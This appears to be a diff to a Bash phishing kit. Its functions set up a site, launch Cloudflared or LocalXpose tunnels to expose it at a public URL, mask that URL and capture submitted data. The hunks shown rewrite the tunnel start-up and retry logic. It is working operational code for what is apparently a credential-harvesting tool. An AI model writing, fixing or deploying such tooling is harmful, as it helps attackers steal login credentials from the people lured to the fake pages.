@@ -316,48 +316,27 @@ capture_data() {
 ## Start Cloudflared
 start_cloudflared() { 
 	rm .server/.cld.log > /dev/null 2>&1
-	cusport
 	echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Initializing... ${GREEN}( ${CYAN}http://$HOST:$PORT ${GREEN})"
 	{ sleep 1; setup_site; }
 	echo -ne "\n\n${RED}[${WHITE}-${RED}]${GREEN} Launching Cloudflared..."
-
-	if [[ `command -v termux-chroot` ]]; then
-		sleep 2 && termux-chroot ./.server/cloudflared tunnel -url "$HOST":"$PORT" --logfile .server/.cld.log > /dev/null 2>&1 &
-	else
-		sleep 2 && ./.server/cloudflared tunnel -url "$HOST":"$PORT" --logfile .server/.cld.log > /dev/null 2>&1 &
-	fi
-
-	echo -ne "\n${RED}[${WHITE}-${RED}]${CYAN} Waiting for tunnel to establish..."
 	
-	# Wait and retry logic to extract cloudflare URL
-	max_attempts=15
+	# Start cloudflared tunnel
+	sleep 2 && ./.server/cloudflared tunnel -url "$HOST":"$PORT" --logfile .server/.cld.log > /dev/null 2>&1 &
+	
+	# Attempt to get URL with retries
 	attempt=0
-	cldflr_url=""
+	max_attempts=15
 	
-	while [[ -z "$cldflr_url" && $attempt -lt $max_attempts ]]; do
+	while [ $attempt -lt $max_attempts ]; do
 		sleep 2
+		cldflr_url=$(grep -o 'https://[-0-9a-z]*\.trycloudflare.com' ".server/.cld.log")
+		if [ ! -z "$cldflr_url" ]; then
+			echo -e "\n${GREEN}[${WHITE}+${GREEN}]${GREEN} Cloudflared tunnel established!"
+			custom_url "$cldflr_url"
+			capture_data
+			return 0
+		fi
 		attempt=$((attempt + 1))
-		
-		# Try to extract URL from log file
-		if [[ -e ".server/.cld.log" ]]; then
-			cldflr_url=$(grep -o 'https://[-0-9a-z]*\.trycloudflare.com' ".server/.cld.log" | head -n1)
-		fi
-		
-		# Show progress indicator
-		if [[ -z "$cldflr_url" ]]; then
-			echo -n "."
-		fi
-	done
-	
-	# Check if URL was successfully extracted
-	if [[ -z "$cldflr_url" ]]; then
-		echo -e "\n\n${RED}[${WHITE}!${RED}]${RED} Error: Unable to establish Cloudflare tunnel."
-		echo -e "${ORANGE}[${WHITE}*${ORANGE}]${ORANGE} Please check your internet connection and try again."
-		echo -e "${CYAN}[${WHITE}*${CYAN}]${CYAN} You can also try restarting the script.\n"
-		exit 1
-	fi
-	
-	echo -e "\n${GREEN}[${WHITE}+${GREEN}]${GREEN} Tunnel established successfully!"
 	custom_url "$cldflr_url"
 	capture_data
 }
@@ -389,11 +368,14 @@ start_loclx() {
 	[[ ${opinion,,} == "y" ]] && loclx_region="eu" || loclx_region="us"
 	echo -e "\n\n${RED}[${WHITE}-${RED}]${GREEN} Launching LocalXpose..."
 
-	if [[ `command -v termux-chroot` ]]; then
-		sleep 1 && termux-chroot ./.server/loclx tunnel --raw-mode http --region ${loclx_region} --https-redirect -t "$HOST":"$PORT" > .server/.loclx 2>&1 &
+	if [[ -e ".server/loclx" ]]; then
+		lclx_path="./.server/loclx"
 	else
-		sleep 1 && ./.server/loclx tunnel --raw-mode http --region ${loclx_region} --https-redirect -t "$HOST":"$PORT" > .server/.loclx 2>&1 &
+		lclx_path="loclx"
 	fi
+	
+	# Start loclx tunnel
+	sleep 1 && $lclx_path tunnel --raw-mode http --region ${loclx_region} --https-redirect -t "$HOST":"$PORT" > .server/.loclx 2>&1 &
 
 	sleep 12
 	loclx_url=$(cat .server/.loclx | grep -o '[0-9a-zA-Z.]*.loclx.io')
